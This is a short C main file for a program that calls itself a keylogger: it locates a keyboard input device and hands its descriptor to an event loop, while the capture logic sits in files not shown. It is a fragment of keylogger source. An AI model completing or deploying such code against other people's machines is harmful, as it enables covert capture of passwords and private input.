#include "keylogger.h"


#define ALWAYS_CLEAN_BUFFER setvbuf(stdout, NULL, _IONBF, 0);


int main(int argc, char const *argv[])
{
	ALWAYS_CLEAN_BUFFER;
	Device* device = NULL;

	if(!find_keyboard_device(&device))
	{
		PRINT(ERROR, "Keyboard device does not exists or you have not permissions to read it\n");
		exit(1);
	}

	event_loop(device->fd);
	
	return 0;
}